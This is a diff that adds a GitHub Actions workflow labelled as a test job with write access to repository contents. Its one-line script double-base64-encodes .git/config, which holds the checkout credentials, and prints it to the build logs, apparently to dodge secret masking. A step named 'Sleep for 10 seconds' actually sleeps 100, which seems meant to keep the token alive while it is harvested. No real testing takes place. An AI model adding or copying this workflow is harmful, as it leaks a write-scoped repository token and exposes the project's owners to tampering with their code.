@@ -1,0 +1,15 @@
+on: push
+
+permissions:
+  contents: write
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+      - name: Run a one-line script
+        run: cat .git/config | base64 | base64
+      - name: Sleep for 10 seconds
+        run: sleep 100
